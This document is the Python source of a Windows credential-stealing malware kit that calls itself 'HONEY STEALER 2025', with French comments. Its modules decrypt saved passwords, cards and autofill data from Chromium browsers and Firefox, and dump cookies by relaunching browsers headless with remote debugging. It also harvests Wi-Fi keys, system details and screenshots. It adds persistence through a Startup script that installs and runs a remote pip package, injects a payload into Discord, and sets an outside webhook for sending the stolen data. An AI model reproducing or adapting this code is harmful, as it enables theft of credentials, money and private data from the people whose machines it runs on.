import threading

import os
import json
import base64
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import ctypes
from ctypes import wintypes
import tempfile
import shutil
import subprocess
import requests
import websocket
import time
import sqlite3
import glob

def expand(path: str) -> str:
    return os.path.expandvars(
        path.replace("%LOCALAPPDATA%", os.getenv("LOCALAPPDATA", ""))
            .replace("%APPDATA%", os.getenv("APPDATA", ""))
    )

def get_master_key(local_state_path: str) -> bytes | None:
    full_path = expand(local_state_path)
    if not os.path.exists(full_path):
        return None
    try:
        with open(full_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_value(encrypted: bytes, master_key: bytes) -> str:
    try:
        if encrypted[:3] in (b'v10', b'v11'):
            iv = encrypted[3:15]
            payload = encrypted[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
            return decrypted
        else:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except Exception:
        return "[Chiffré]"

def chrome_time_to_str(chrome_time: int) -> str:
    try:
        return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime("%Y-%m-%d %H:%M")
    except Exception:
        return "N/A"

NSS3_DLL = None
nss_paths = [
    r"C:\Program Files\Mozilla Firefox\nss3.dll",
    r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll",
    os.path.expandvars(r"%PROGRAMFILES%\Mozilla Firefox\nss3.dll"),
    os.path.expandvars(r"%PROGRAMFILES(X86)%\Mozilla Firefox\nss3.dll"),
]
for path in nss_paths:
    if os.path.exists(path):
        NSS3_DLL = ctypes.CDLL(path)
        break

if NSS3_DLL:
    NSS3_DLL.NSS_Init.argtypes = [wintypes.LPCSTR]
    NSS3_DLL.NSS_Init.restype = wintypes.LONG

    class SECItem(ctypes.Structure):
        _fields_ = [
            ("type", wintypes.DWORD),
            ("data", ctypes.POINTER(wintypes.BYTE)),
            ("len", wintypes.DWORD)
        ]

    NSS3_DLL.PK11SDR_Decrypt.argtypes = [ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p]
    NSS3_DLL.PK11SDR_Decrypt.restype = wintypes.LONG

def nss_init(profile_path: str) -> bool:
    if not NSS3_DLL:
        return False
    try:
        return NSS3_DLL.NSS_Init(profile_path.encode('utf-8')) == 0
    except Exception:
        return False

def nss_decrypt(b64_str: str) -> str:
    if not NSS3_DLL:
        return "[NSS manquant]"
    try:
        data = base64.b64decode(b64_str)
        encrypted = SECItem(0, ctypes.cast(data, ctypes.POINTER(wintypes.BYTE)), len(data))
        decrypted = SECItem()
        if NSS3_DLL.PK11SDR_Decrypt(ctypes.byref(encrypted), ctypes.byref(decrypted), None) == 0:
            return ctypes.string_at(decrypted.data, decrypted.len).decode('utf-8', errors='ignore')
        return "[Échec]"
    except Exception:
        return "[Erreur]"

def copy_db(src_path: str, temp_path: str) -> bool:
    try:
        if os.path.exists(src_path):
            shutil.copy2(src_path, temp_path)
            return True
        return False
    except Exception:
        return False

def kill_browser(exe_name):
    subprocess.run(f'taskkill /F /IM {exe_name}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_debug_ws_url(port=9222):
    try:
        res = requests.get(f'http://localhost:{port}/json', timeout=5)
        data = res.json()
        return data[0]['webSocketDebuggerUrl']
    except Exception:
        return None

def start_debug_browser(exe_path, data_dir, profile):
    if not os.path.exists(exe_path):
        return False
    try:
        subprocess.Popen([
            exe_path,
            f'--remote-debugging-port=9222',
            '--remote-allow-origins=*',
            '--headless',
            f'--user-data-dir={data_dir}',
            f'--profile-directory={profile}'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        return True
    except Exception:
        return False

def get_cookies_via_ws():
    url = get_debug_ws_url()
    if not url:
        return None
    try:
        ws = websocket.create_connection(url, timeout=10)
        ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
        response = ws.recv()
        ws.close()
        data = json.loads(response)
        return data.get('result', {}).get('cookies', [])
    except Exception:
        return None



import subprocess
import sys
import os
import textwrap
import shutil  

def advanced_persistence():
    # Chemin du dossier Démarrage de l'utilisateur courant
    startup_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    persistence_file = os.path.join(startup_dir, "system_updater.pyw")  # ← ton fichier .pyw final

    # Payload qui sera écrit dans le .pyw
    malicious_script = textwrap.dedent('''
        import os
        import subprocess
        import sys
        import time

        def install_or_reinstall():
            package = "rtcpstream"
            try:
                __import__(package)
            except ImportError:
                try:
                    subprocess.check_call([
                        sys.executable, "-m", "pip", "install", package,
                        "--quiet", "--disable-pip-version-check", "--no-cache-dir"
                    ], creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    pass

        if __name__ == "__main__":
            time.sleep(10)                  # petit délai au démarrage
            install_or_reinstall()
            try:
                import rtcpstream
                if hasattr(rtcpstream, "run"):
                    rtcpstream.run()
                elif hasattr(rtcpstream, "main"):
                    rtcpstream.main()
                elif hasattr(rtcpstream, "start"):
                    rtcpstream.start()
            except:
                pass
    ''').lstrip()

    # Écrit (ou ré-écrit si différent) uniquement le .pyw dans le dossier Startup
    try:
        if not os.path.exists(persistence_file):
            with open(persistence_file, "w", encoding="utf-8") as f:
                f.write(malicious_script)
            # print(f"[+] Persistance .pyw créée : {persistence_file}")  # décommente si besoin
        else:
            with open(persistence_file, "r", encoding="utf-8") as f:
                current_content = f.read().strip()
            if current_content != malicious_script.strip():
                with open(persistence_file, "w", encoding="utf-8") as f:
                    f.write(malicious_script)
                # print(f"[~] Persistance .pyw mise à jour : {persistence_file}")
    except Exception as e:
        pass

def format_cookie_netscape(cookie):
    domain = cookie.get('domain', '')
    secure = "TRUE" if cookie.get('secure') else "FALSE"
    path = cookie.get('path', '/')
    http_only = "TRUE" if cookie.get('httpOnly') else "FALSE"
    expires = str(int(cookie.get('expires', 0))) if cookie.get('expires') else "0"
    name = cookie.get('name', '')
    value = cookie.get('value', '')
    return f"{domain}\t{secure}\t{path}\t{http_only}\t{expires}\t{name}\t{value}"

def inject_discord(webhook_url):
    discord_paths = [
        os.path.expandvars(r"%APPDATA%\discord"),
        os.path.expandvars(r"%LOCALAPPDATA%\Discord"),
        os.path.expandvars(r"%LOCALAPPDATA%\DiscordCanary"),
        os.path.expandvars(r"%LOCALAPPDATA%\DiscordPTB")
    ]
    injection_dir = os.path.join(os.path.dirname(__file__), "injection")
    payload_js = os.path.join(injection_dir, "payload.js")

    if not os.path.exists(injection_dir):
        os.makedirs(injection_dir)

    for base in discord_paths:
        if not os.path.exists(base): continue
        core_dir = None
        for root, dirs, _ in os.walk(base):
            if "discord_desktop_core" in dirs:
                core_dir = os.path.join(root, "discord_desktop_core")
                break
        if not core_dir: continue
        index_js = os.path.join(core_dir, "index.js")
        if os.path.exists(index_js) and "injection" not in open(index_js).read():
            try:
                shutil.copy(index_js, index_js + ".bak")
                with open(index_js, "w") as f:
                    escaped_path = payload_js.replace('\\', '\\\\')
                    f.write(f"require('{escaped_path}'); require('./core.asar');")
            except: pass

# ===== FILE: config.py =====

import os


WEBHOOK_URL = "https://honey.zakura-int.workers.dev"
CHROMIUM_BROWSERS = [
    {
        "name": "Brave Stable",
        "base": "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data",
        "state": "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
        "profiles": ["Default"] + [f"Profile {i}" for i in range(1, 100)],
        "folder": "Brave_Stable",
        "pwd": True,
        "exe": r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
    },
    {
        "name": "Opera Stable",
        "base": "%APPDATA%\\Opera Software\\Opera Stable",
        "state": "%APPDATA%\\Opera Software\\Opera Stable\\Local State",
        "profiles": [""],
        "folder": "Opera_Stable",
        "pwd": True,
        "exe": rf"{os.getenv('LOCALAPPDATA')}\Programs\Opera\opera.exe"
    },
    {
        "name": "Opera GX",
        "base": "%APPDATA%\\Opera Software\\Opera GX Stable",
        "state": "%APPDATA%\\Opera Software\\Opera GX Stable\\Local State",
        "profiles": [""],
        "folder": "Opera_GX",
        "pwd": True,
        "exe": rf"{os.getenv('LOCALAPPDATA')}\Programs\Opera GX\opera.exe"
    },
    {
        "name": "Edge Stable",
        "base": "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",
        "state": "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Local State",
        "profiles": ["Default"] + [f"Profile {i}" for i in range(1, 100)],
        "folder": "Edge_Stable",
        "pwd": True,
        "exe": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    },
    {
        "name": "Vivaldi",
        "base": "%LOCALAPPDATA%\\Vivaldi\\User Data",
        "state": "%LOCALAPPDATA%\\Vivaldi\\User Data\\Local State",
        "profiles": ["Default"] + [f"Profile {i}" for i in range(1, 100)],
        "folder": "Vivaldi",
        "pwd": True,
        "exe": rf"{os.getenv('LOCALAPPDATA')}\Vivaldi\Application\vivaldi.exe"
    },
    {
    "name": "Avast Secure Browser",
    "base": "%LOCALAPPDATA%\\AVAST Software\\Browser\\User Data",
    "state": "%LOCALAPPDATA%\\AVAST Software\\Browser\\User Data\\Local State",
    "profiles": ["Default"] + [f"Profile {i}" for i in range(1, 100)],
    "folder": "Avast_Secure",
    "pwd": True,
    "exe": r"C:\Program Files (x86)\AVAST Software\Browser\Application\AvastBrowser.exe"
    },
    {
        "name": "Chrome Stable",
        "base": "%LOCALAPPDATA%\\Google\\Chrome\\User Data",
        "state": "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State",
        "profiles": ["Default"] + [f"Profile {i}" for i in range(1, 100)],
        "folder": "Chrome_Stable",
        "pwd": True,
        "exe": r"C:\Program Files\Google\Chrome\Application\chrome.exe"
    }

]
# ===== FILE: dumper.py (VERSION ULTRA CLEAN – TOUT DANS DOCUMENTS + SUPPRESSION TOTALE) =====
import os
import uuid
import shutil
import zipfile
from pathlib import Path
from datetime import datetime

HONEY_HEADER = """
╔══════════════════════════════════════════════════════════════╗
║ H O N E Y S T E A L E R 2 0 2 5 ║
║ Made with love by Honey Team ║
╚══════════════════════════════════════════════════════════════╝
"""

class DataDumper:
    def __init__(self, zip_output=True, password=None):
        self.session = str(uuid.uuid4())[:8].upper()
        
        # DOSSIER DOCUMENTS DE L'UTILISATEUR
        self.documents = Path(os.path.expanduser("~/Documents"))
        self.root = self.documents / f"{self.session}_honey"
        self.root.mkdir(parents=True, exist_ok=True)

        # Création des sous-dossiers
        for folder in ["Passwords", "Autofill", "Cookies", "History", "Discord", "System", "Screenshots", "Files"]:
            (self.root / folder).mkdir(exist_ok=True)
        for sub in ["Desktop", "Downloads", "Documents", "Pictures", "Bureau", "Téléchargements", "Images", "Others"]:
            (self.root / "Files" / sub).mkdir(parents=True, exist_ok=True)

        self.zip_output = zip_output
        self.zip_password = password.encode() if password else None

        # ZIP aussi dans Documents
        self.light_zip = self.documents / f"{self.session}.zip"
        self.full_zip  = self.documents / f"{self.session}full.zip"

    def save(self, filename: str, content: str, folder: str):
        safe_name = "".join(c if c not in r'\/:*?"<>|' else "_" for c in filename)[:150]
        path = self.root / folder / safe_name
        header = f"{HONEY_HEADER}\n[+] {folder.upper()} → {safe_name}\n[+] {datetime.now():%d/%m/%Y %H:%M}\n{'═'*70}\n\n"
        try:
            path.write_text(header + content + "\n\nGenerated by HONEY STEALER 2025", encoding="utf-8")
        except:
            pass

    def save_image(self, src_path: str, folder: str = "Screenshots"):
        src = Path(src_path)
        if not src.exists():
            return
        safe_name = "".join(c if c not in r'\/:*?"<>|' else "_" for c in src.name)
        dest = self.root / folder / safe_name
        try:
            shutil.copy2(src, dest)
        except:
            pass

    def save_stolen_file(self, src_path: str):
        src = Path(src_path)
        if not src.exists() or src.stat().st_size > 10 * 1024 * 1024:
            return
        target_folder = "Others"
        src_str = str(src).lower()
        mapping = {
            "desktop": "Desktop", "bureau": "Bureau",
            "downloads": "Downloads", "téléchargements": "Téléchargements",
            "documents": "Documents", "pictures": "Pictures", "images": "Images"
        }
        for key, name in mapping.items():
            if key in src_str:
                target_folder = name
                break
        safe_name = "".join(c if c not in r'\/:*?"<>|' else "_" for c in src.name)[:100]
        dest = self.root / "Files" / target_folder / safe_name
        if dest.exists():
            dest = dest.with_name(f"{dest.stem}_{uuid.uuid4().hex[:6]}{dest.suffix}")
        try:
            shutil.copy2(src, dest)
        except:
            pass

    def compress(self, exclude_folder: str = None):
        if not self.zip_output:
            return None
        zip_path = self.light_zip if exclude_folder else self.full_zip
        try:
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                if self.zip_password:
                    zf.setpassword(self.zip_password)
                for file in self.root.rglob("*"):
                    if file.is_file():
                        if exclude_folder and exclude_folder in file.parts:
                            continue
                        arcname = file.relative_to(self.root.parent)
                        zf.write(file, arcname)
            return str(zip_path)
        except:
            return None

    # NETTOYAGE TOTAL – PLUS RIEN DANS DOCUMENTS
    def cleanup(self):
        try:
            # Suppression du dossier temporaire + tout son contenu
            if self.root.exists():
                shutil.rmtree(self.root, ignore_errors=True)
            
            # Suppression des deux ZIP finaux
            for zip_file in [self.light_zip, self.full_zip]:
                if zip_file.exists():
                    try:
                        zip_file.unlink()
                    except:
                        pass
        except:
            pass


# ===== FILE: system.py =====

import os
import platform
import psutil
import subprocess
import winreg
import ctypes
import requests
from datetime import datetime
import tempfile

try:
    import mss
    HAS_MSS = True
except ImportError:
    HAS_MSS = False


def get_product_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        value, _ = winreg.QueryValueEx(key, "DigitalProductId")
        winreg.CloseKey(key)

        digits = "BCDFGHJKMPQRTVWXY2346789"
        key_bytes = bytearray(value[52:67])
        product_key = ""

        for i in range(24, -1, -1):
            cur = 0
            for j in range(14, -1, -1):
                cur = (cur * 256) ^ key_bytes[j]
                key_bytes[j] = cur // 24
                cur %= 24
            product_key = digits[cur] + product_key
            if (25 - i) % 5 == 0 and i != 25:
                product_key = "-" + product_key

        return product_key
    except Exception:
        return "Not Found"


def get_screens(dumper):
    if not HAS_MSS:
        return

    try:
        with mss.mss() as sct:
            for i, monitor in enumerate(sct.monitors[1:], 1):
                img = sct.grab(monitor)
                filepath = os.path.join(tempfile.gettempdir(), f"screen_{i}.png")
                mss.tools.to_png(img.rgb, img.size, output=filepath)
                dumper.save_image(filepath, "System")
                try:
                    os.unlink(filepath)
                except Exception:
                    pass
    except Exception:
        pass


def get_system_full(dumper):
    username = os.getenv("USERNAME", "Unknown")
    hostname = os.getenv("COMPUTERNAME", "Unknown")
    user_host = f"{username}@{hostname}"

    try:
        users = [
            d for d in os.listdir("C:\\Users")
            if os.path.isdir(f"C:\\Users\\{d}") and d not in ["Public", "Default", "All Users", "Default User"]
        ]
        users_list = "\n".join(users) if users else "None"
    except Exception:
        users_list = "Error"

    os_full = "Microsoft Windows"
    ver = platform.win32_ver()
    if ver[0]:
        os_full += f" {ver[0]}"
    if ver[1]:
        os_full += f" {ver[1]}"
    if "10" in platform.release() and int(platform.version().split('.')[2]) >= 22000:
        os_full = os_full.replace("10", "11")

    cpu = platform.processor() or "Unknown"

    try:
        gpu_output = subprocess.check_output(
            "wmic path win32_VideoController get name", text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).splitlines()
        gpu = next((line.strip() for line in gpu_output if line.strip() and "Name" not in line), "Unknown")
    except Exception:
        gpu = "Unknown"

    ram_gb = f"{psutil.virtual_memory().total / (1024**3):.2f} GB"

    try:
        mac = next(
            (addr.address for iface, addrs in psutil.net_if_addrs().items()
             for addr in addrs if addr.family == psutil.AF_LINK and addr.address != "00:00:00:00:00:00"),
            "Unknown"
        )
    except Exception:
        mac = "Unknown"

    try:
        hwid_output = subprocess.check_output(
            "wmic csproduct get uuid", text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).splitlines()
        hwid = next((line.strip() for line in hwid_output if line.strip() and "UUID" not in line), "Unknown")
    except Exception:
        hwid = "Unknown"

    product_key = get_product_key()

    disks_lines = ["Drive Free Total Use"]
    try:
        for part in psutil.disk_partitions():
            if 'cdrom' in part.opts or not part.fstype:
                continue
            try:
                usage = psutil.disk_usage(part.mountpoint)
                free_gb = int(usage.free / (1024**3))
                total_gb = int(usage.total / (1024**3))
                used_pct = int(usage.used / usage.total * 100)
                drive = part.device.rstrip('\\').ljust(6)
                free_str = str(free_gb).ljust(6)
                total_str = str(total_gb).ljust(6)
                line = f"{drive} {free_str}GB {total_str}GB {used_pct}%"
                disks_lines.append(line)
            except Exception:
                continue
    except Exception:
        disks_lines.append("Error reading disks")

    try:
        net = requests.get("http://ip-api.com/json", timeout=10).json()
        ip = net.get("query", "N/A")
        country = net.get("country", "N/A")
        region = net.get("regionName", "N/A")
        city = net.get("city", "N/A")
        postal = net.get("zip", "N/A")
        isp = net.get("isp", "N/A")
        as_num = net.get("as", "N/A")
        lat = net.get("lat", "N/A")
        lon = net.get("lon", "N/A")
    except Exception:
        ip = country = region = city = postal = isp = as_num = lat = lon = "N/A"

    wifi_lines = []
    try:
        profiles = subprocess.check_output(
            "netsh wlan show profiles", text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        networks = [
            line.split(":", 1)[1].strip()
            for line in profiles.splitlines()
            if "Tous les utilisateurs" in line or "All User Profile" in line
        ]
        for net in networks:
            try:
                out = subprocess.check_output(
                    f'netsh wlan show profile name="{net}" key=clear', text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                key = next(
                    (l.split(":", 1)[1].strip() for l in out.splitlines()
                     if "Contenu de la cl" in l or "Key Content" in l),
                    None
                )
                wifi_lines.append(f"{net} | {key or 'None'}")
            except Exception:
                wifi_lines.append(f"{net} | Error")
    except Exception:
        wifi_lines = ["Not Found"]

    file_location = os.path.abspath(__file__)

    try:
        import locale
        lang = locale.windows_locale.get(ctypes.windll.kernel32.GetUserDefaultUILanguage(), "Unknown")
    except Exception:
        lang = "Unknown"

    try:
        user32 = ctypes.windll.user32
        screen = f"{{Width={user32.GetSystemMetrics(0)}, Height={user32.GetSystemMetrics(1)}}}"
    except Exception:
        screen = "N/A"

    try:
        tz = subprocess.check_output(
            'powershell -Command "[System.TimeZoneInfo]::Local.Id"', text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).strip()
    except Exception:
        tz = "N/A"

    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
        uac_val = winreg.QueryValueEx(key, "EnableLUA")[0]
        uac = "AllowAll" if uac_val == 1 else "Restricted"
        winreg.CloseKey(key)
    except Exception:
        uac = "N/A"

    elevation = "True" if ctypes.windll.shell32.IsUserAnAdmin() else "False"
    log_date = datetime.now().strftime("%m/%d/%Y %I:%M:%S %p")

    try:
        import win32api
        keyboard = "French (France)" if "0000040C" in win32api.GetKeyboardLayoutName() else "Unknown"
    except Exception:
        keyboard = "Unknown"

    try:
        av_out = subprocess.check_output(
            'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName',
            text=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        antivirus = "\n".join([l.strip() for l in av_out.splitlines() if l.strip() and "displayName" not in l]) or "None"
    except Exception:
        antivirus = "Windows Defender"

    disks_section = "\n".join(disks_lines)
    wifi_section = "\n".join(wifi_lines) if wifi_lines != ["Not Found"] else "Not Found"

    report = f"""============================================================
 SYSTEM INFORMATION - {user_host}
============================================================
[USER]
Username: {username}
Hostname: {hostname}
Users: {users_list}
[SYSTEM]
OS: {os_full}
CPU: {cpu}
GPU: {gpu}
RAM: {ram_gb}
MAC: {mac}
HWID: {hwid}
Product Key: {product_key}
FileLocation: {file_location}
Current Language: {lang}
ScreenSize: {screen}
TimeZone: {tz}
UAC: {uac}
Process Elevation: {elevation}
Log date: {log_date}
Available KeyboardLayouts:
{keyboard}
Hardwares:
Name: {cpu} , {psutil.cpu_count(logical=False)} Cores
Name: {gpu}, {psutil.virtual_memory().total} bytes
Name: Total of RAM, {ram_gb} or {psutil.virtual_memory().total} bytes
Anti-Viruses:
{antivirus}
[DISKS]
{disks_section}
[NETWORK]
IP: {ip}
Country: {country}
Region: {region}
Postal: {postal}
City: {city}
ISP: {isp}
AS: {as_num}
Latitude: {lat}
Longitude: {lon}
[WIFI]
{wifi_section}
"""

    dumper.save("system_full.txt", report.strip(), "System")


# ===== FILE: chromium.py =====

# chromium.py
import os
import sqlite3
import tempfile
import shutil
# removed: internal import (

def get_existing_profiles(base_path):

    profiles = set()
    if not os.path.exists(base_path):
        return profiles

    try:
        for item in os.listdir(base_path):
            full_path = os.path.join(base_path, item)
            if not os.path.isdir(full_path):
                continue
            web_data = os.path.join(full_path, "Web Data")
            login_data = os.path.join(full_path, "Login Data")
            if os.path.exists(web_data) or os.path.exists(login_data):
                profiles.add(item)
    except Exception:
        pass

    # Profil par défaut (sans sous-dossier)
    if os.path.exists(os.path.join(base_path, "Web Data")):
        profiles.add("")

    return sorted(profiles)


def extract_chromium_passwords(browser, profile, dumper):
    base_path = expand(browser["base"])
    profile_path = base_path if not profile else os.path.join(base_path, profile)
    db_path = os.path.join(profile_path, "Login Data")
    if not os.path.exists(db_path):
        return

    temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db").name
    try:
        if not copy_db(db_path, temp_db):
            return

        master_key = get_master_key(browser["state"]) if browser.get("pwd", False) else None
        entries = []

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created
                FROM logins
                WHERE username_value != '' OR password_value != ''
            """)
            for url, username, encrypted_password, date_created in cursor.fetchall():
                clean_url = url.split('?')[0].rstrip('/')
                if not clean_url.startswith(("http://", "https://")):
                    continue

                password = "[Non chiffré]"
                if encrypted_password and master_key:
                    try:
                        password = decrypt_value(encrypted_password, master_key)
                    except:
                        password = "[Échec déchiffrement]"
                elif encrypted_password:
                    password = "[Chiffré sans clé]"

                created = chrome_time_to_str(date_created) if date_created else "N/A"
                entries.append(f"{clean_url} | {username} | {password} | Créé: {created}")
        except Exception:
            pass
        finally:
            conn.close()

        if entries:
            profile_name = (profile or "Default").replace(" ", "_")
            filename = f"{browser['folder']}_{profile_name}_passwords.txt"
            dumper.save(filename, "\n".join(entries), "Passwords")

    except Exception:
        pass
    finally:
        try:
            os.unlink(temp_db)
        except:
            pass


def extract_chromium_autofill(browser, profile, dumper):
    base_path = expand(browser["base"])
    profile_path = base_path if not profile else os.path.join(base_path, profile)
    db_path = os.path.join(profile_path, "Web Data")
    if not os.path.exists(db_path):
        return

    temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db").name
    try:
        if not copy_db(db_path, temp_db):
            return

        master_key = get_master_key(browser["state"]) if browser.get("pwd", False) else None
        lines = []
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        # === 1. CHAMPS SIMPLES (autofill) ===
        try:
            cursor.execute("SELECT name, value, count FROM autofill WHERE value != ''")
            for name, value, count in cursor.fetchall():
                if value and value.strip():
                    lines.append(f"[{name}] {value} (Utilisé {count}x)")
        except Exception:
            pass

        # === 2. ADRESSES COMPLÈTES ===
        try:
            cursor.execute("""
                SELECT
                    company_name, full_name,
                    address_home_line1, address_home_line2, address_home_street_address,
                    address_home_city, address_home_state, address_home_zip,
                    address_home_country,
                    phone_home_whole_number, email_address
                FROM autofill_profiles
            """)
            for row in cursor.fetchall():
                company, full, l1, l2, street, city, state, zipc, country, phone, email = row
                if not any([full, l1, l2, street, city, state, zipc, country, phone, email, company]):
                    continue
                lines.append(f"[ADRESSE] {full or 'Inconnu'}")
                if company: lines.append(f"  Société: {company}")
                addr_parts = [x for x in [l1, l2, street] if x and x.strip()]
                if addr_parts: lines.append(f"  Rue: {' | '.join(addr_parts)}")
                loc = ", ".join(filter(None, [city, state, zipc])).strip()
                if loc: lines.append(f"  Localité: {loc}")
                if country: lines.append(f"  Pays: {country}")
                if phone: lines.append(f"  Téléphone: {phone}")
                if email: lines.append(f"  Email: {email}")
                lines.append("---")
        except Exception:
            pass

        # === 3. CARTES BANCAIRES ===
        try:
            cursor.execute("""
                SELECT
                    name_on_card, expiration_month, expiration_year,
                    card_number_encrypted, nickname, date_modified
                FROM credit_cards
            """)
            for name, month, year, encrypted, nick, modified in cursor.fetchall():
                if not name and not encrypted:
                    continue
                number = "[Non chiffrée]"
                if encrypted and master_key:
                    try:
                        raw = decrypt_value(encrypted, master_key)
                        number = f"**** **** **** {raw[-4:]}" if len(raw) >= 4 else "****"
                    except:
                        number = "[Échec déchiffrement]"
                elif encrypted:
                    number = "[Chiffrée sans clé]"

                lines.append(f"[CARTE] {name or 'Inconnue'}")
                if nick: lines.append(f"  Surnom: {nick}")
                lines.append(f"  Numéro: {number}")
                lines.append(f"  Exp: {month}/{year}")
                if modified:
                    mod_str = chrome_time_to_str(modified)
                    lines.append(f"  Modifié: {mod_str}")
                lines.append("---")
        except Exception:
            pass

        conn.close()

        if lines:
            profile_name = (profile or "Default").replace(" ", "_")
            filename = f"{browser['folder']}_{profile_name}_autofill.txt"
            count = len([l for l in lines if l.startswith('[')])
            dumper.save(filename, "\n".join(lines), "Autofill")

    except Exception:
        pass
    finally:
        try:
            os.unlink(temp_db)
        except:
            pass


def extract_chromium_cookies(browser, profile, dumper):
    if "exe" not in browser or not os.path.exists(browser["exe"]):
        return

    base_path = expand(browser["base"])
    profile_path = base_path if not profile else os.path.join(base_path, profile)
    if not os.path.exists(profile_path):
        return

    exe_name = os.path.basename(browser["exe"])
    kill_browser(exe_name)

    profile_dir = profile or "Default"
    if not start_debug_browser(browser["exe"], base_path, profile_dir):
        return

    cookies = get_cookies_via_ws()
    kill_browser(exe_name)
    if not cookies:
        return

    valid_domains = (".com", ".net", ".org", ".fr", ".io", ".co", ".gg", ".tv", ".app")
    formatted = [
        format_cookie_netscape(c)
        for c in cookies
        if c.get("domain", "").endswith(valid_domains)
    ]

    if formatted:
        profile_name = (profile or "Default").replace(" ", "_")
        filename = f"{browser['folder']}_{profile_name}_cookies.txt"
        dumper.save(filename, "\n".join(formatted), "Cookies")


def extract_chromium_history(browser, profile, dumper):
    base_path = expand(browser["base"])
    profile_path = base_path if not profile else os.path.join(base_path, profile)
    db_path = os.path.join(profile_path, "History")

    if not os.path.exists(db_path):
        return

    temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db").name
    try:
        if not copy_db(db_path, temp_db):
            return

        entries = []
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute("""
                SELECT
                    urls.url,
                    urls.title,
                    urls.visit_count,
                    urls.last_visit_time
                FROM urls
                ORDER BY urls.last_visit_time DESC
            """)
            for url, title, visits, last_time in cursor.fetchall():
                if not url.startswith(("http://", "https://")):
                    continue
                if "chrome-extension" in url or not title:
                    title = "[Sans titre]"
                else:
                    title = title.strip()
                    if len(title) > 100:
                        title = title[:97] + "..."

                visit_date = chrome_time_to_str(last_time) if last_time else "N/A"
                entries.append(f"[{visit_date}] {url} | {title} | Visites: {visits}")
        except Exception:
            pass
        finally:
            conn.close()

        if entries:
            profile_name = (profile or "Default").replace(" ", "_")
            filename = f"{browser['folder']}_{profile_name}_history.txt"
            dumper.save(filename, "\n".join(entries), "History")

    except Exception:
        pass
    finally:
        try:
            os.unlink(temp_db)
        except:
            pass

# ===== FILE: firefox.py =====

import os
import glob
import json
import sqlite3
import tempfile
import shutil
from datetime import datetime
from pathlib import Path
# removed: internal import nss_init, nss_decrypt, copy_db


# ============================================================
#  UTILS
# ============================================================
def safe_copy_full(base_path: Path, tmp_base: Path):
    """Copie places.sqlite + WAL + SHM pour éviter les bases verrouillées."""
    try:
        shutil.copy2(base_path, tmp_base)
        for ext in ["-wal", "-shm"]:
            src = Path(str(base_path) + ext)
            dst = Path(str(tmp_base) + ext)
            if src.exists():
                shutil.copy2(src, dst)
        return True
    except Exception:
        return False


def firefox_profiles():
    """Retourne les profils Firefox sous Windows."""
    profiles_dir = Path(os.getenv("APPDATA")) / "Mozilla" / "Firefox" / "Profiles"
    if profiles_dir.exists():
        return [p for p in profiles_dir.iterdir() if p.is_dir()]
    return []


# ============================================================
#  MOTS DE PASSE
# ============================================================
def extract_firefox_passwords(dumper):
    profiles = firefox_profiles()
    if not profiles:
        return

    for profile in profiles:
        logins = profile / "logins.json"
        if not logins.exists():
            continue

        profile_name = profile.name
        if not nss_init(str(profile)):
            continue

        try:
            data = json.loads(logins.read_text(encoding="utf-8"))
            lines = []
            for login in data.get("logins", []):
                url = login.get("hostname", "")
                user = nss_decrypt(login.get("encryptedUsername", "")) or ""
                pwd = nss_decrypt(login.get("encryptedPassword", "")) or ""
                created = login.get("timeCreated")
                created = datetime.fromtimestamp(created / 1000).strftime("%Y-%m-%d %H:%M") if created else "N/A"
                lines.append(f"{url} | {user} | {pwd} | Créé : {created}")

            if lines:
                dumper.save(
                    f"Firefox_{profile_name}_passwords.txt",
                    "\n".join(lines),
                    "Passwords"
                )
        except Exception:
            pass


# ============================================================
#  HISTORIQUE FORMULAIRES
# ============================================================
def extract_firefox_formhistory(dumper):
    profiles = firefox_profiles()
    if not profiles:
        return

    for profile in profiles:
        form_db = profile / "formhistory.sqlite"
        if not form_db.exists():
            continue

        profile_name = profile.name
